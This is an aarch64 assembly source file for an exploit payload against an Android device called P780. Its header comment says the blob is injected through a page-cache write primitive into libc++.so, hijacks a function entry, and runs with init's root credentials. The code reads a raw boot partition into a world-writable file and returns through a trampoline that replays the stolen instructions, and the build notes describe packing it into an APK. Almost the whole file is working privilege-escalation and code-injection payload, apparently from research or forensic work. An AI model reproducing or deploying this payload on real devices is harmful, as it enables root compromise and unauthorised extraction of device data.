/*
 * P780 init-domain partition dumper payload (aarch64, raw syscalls only).
 *
 * Used on 2026-10-26 to re-extract evidence/20261026/partitions after the
 * original local copies were lost.  Same mechanism as the 2026-10-25 dumper:
 * DirtyFrag writes this blob into the page cache of /system/lib64/libc++.so at
 * 0x790b0 and redirects the __sentry entry at 0x62fb4 into it; the next time
 * init's main thread logs through libc++ the blob runs with init's credentials.
 *
 * Gate:   gettid()==1 && getpid()==1 && uid==0   (init main thread only)
 * Lock:   /dev/p780_vbN_lock   (O_CREAT|O_EXCL, one dump per boot/patch)
 * Action: read 8 MiB from /dev/block/by-name/<partition> into an anonymous
 *         mapping, then write it to /metadata/cur.bin (init may write
 *         metadata_file; installd cannot read block devices).
 * Exit:   replay the four stolen sentry instructions, then jump back to
 *         sentry+16.  No fork, no exec, no partition write.
 *
 * Build notes (2026-10-26 run):
 *   - blob length 816 bytes (same as the payload already inside the Elevate APK,
 *     so the APK's STUB_HEX literal can be replaced in place in classes.dex);
 *   - sentry prologue slot at +0x190, return trampoline at +0x1a0;
 *   - the two .word after the NOP slots are rewritten to
 *     adrp x9, <ret page> / add x9, x9, #<ret offset> with ret = 0x62fc4.
 *   - the builder (work/assemble.py in the 2026-10-26 session) resolved labels
 *     with keystone; this file is the human-readable record of that blob.
 */
    .text
    .balign 16
p780_dump_stub:
    stp     x0, x1, [sp, #-96]!
    stp     x2, x3, [sp, #16]
    stp     x19, x20, [sp, #32]
    stp     x21, x22, [sp, #48]
    stp     x23, x29, [sp, #64]
    str     x30, [sp, #80]

    /* ---- gate: init main thread ---- */
    mov     x8, #178                   /* gettid */
    svc     #0
    cmp     x0, #1
    b.ne    out
    mov     x8, #172                   /* getpid */
    svc     #0
    cmp     x0, #1
    b.ne    out
    mov     x8, #174                   /* getuid */
    svc     #0
    cbnz    x0, out

    /* ---- one-shot lock ---- */
    movn    x0, #99                    /* AT_FDCWD */
    adr     x1, lock_path
    movz    x2, #0xc1                  /* O_WRONLY|O_CREAT|O_EXCL */
    movz    x3, #0x1a4
    mov     x8, #56                    /* openat */
    svc     #0
    tbnz    x0, #63, out
    mov     x9, x0
    mov     x0, x9
    mov     x8, #57                    /* close */
    svc     #0

    /* ---- drop a stale chunk ---- */
    movn    x0, #99
    adr     x1, out_path
    mov     x2, #0                     /* AT_REMOVEDIR = 0 */
    mov     x8, #35                    /* unlinkat */
    svc     #0

    /* ---- open /metadata/cur.bin ---- */
    movn    x0, #99
    adr     x1, out_path
    movz    x2, #0x241                 /* O_WRONLY|O_CREAT|O_TRUNC */
    movz    x3, #0x1b6                 /* 0666 */
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, out
    mov     x19, x0

    /* ---- open the block device ---- */
    movn    x0, #99
    adr     x1, dev_path
    mov     x2, #0                     /* O_RDONLY */
    mov     x3, #0
    mov     x8, #56
    svc     #0
    tbnz    x0, #63, close_out
    mov     x20, x0

    /* ---- 8 MiB anonymous buffer ---- */
    mov     x0, #0
    movz    x1, #0x80, lsl #16
    mov     x2, #3                     /* PROT_READ|PROT_WRITE */
    mov     x3, #0x22                  /* MAP_PRIVATE|MAP_ANONYMOUS */
    movn    x4, #0                     /* -1 */
    mov     x5, #0
    mov     x8, #222                   /* mmap */
    svc     #0
    tbnz    x0, #63, close_both
    mov     x21, x0

    /* ---- read loop: 1 MiB per call, stop at 8 MiB or short read ---- */
    mov     x22, #0
read_loop:
    mov     x0, x20
    add     x1, x21, x22
    mov     x2, #0x100000
    mov     x8, #63                    /* read */
    svc     #0
    cmp     x0, #0
    b.le    read_done
    add     x22, x22, x0
    cmp     x22, #0x800000
    b.lt    read_loop

read_done:
    /* ---- write loop ---- */
    mov     x23, #0
write_loop:
    mov     x0, x19
    add     x1, x21, x23
    sub     x2, x22, x23
    mov     x8, #64                    /* write */
    svc     #0
    cmp     x0, #0
    b.le    write_done
    add     x23, x23, x0
    cmp     x23, x22
    b.lt    write_loop

write_done:
    mov     x0, x20
    mov     x8, #57
    svc     #0
    mov     x0, x19
    mov     x8, #57
    svc     #0
    b       out

close_both:
    mov     x0, x20
    mov     x8, #57
    svc     #0
close_out:
    mov     x0, x19
    mov     x8, #57
    svc     #0

out:
    ldr     x30, [sp, #80]
    ldp     x23, x29, [sp, #64]
    ldp     x21, x22, [sp, #48]
    ldp     x19, x20, [sp, #32]
    ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp], #96

    /* sentry prologue replay slot: replaced at build time with the 4 original
       instructions at 0x62fb4 (fd7bbea9 f30b00f9 fd030091 1f000039) */
    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f
    .word   0xd503201f

    /* return trampoline: replaced at build time with adrp/add for 0x62fc4 */
    .word   0x90000009
    .word   0x91000129
    .inst   0xd61f0120
    .word   0xd503201f

    .balign 8
lock_path:
    .asciz  "/dev/p780_vb1_lock"
out_path:
    .asciz  "/metadata/cur.bin"
dev_path:
    .asciz  "/dev/block/by-name/vendor_boot_b"
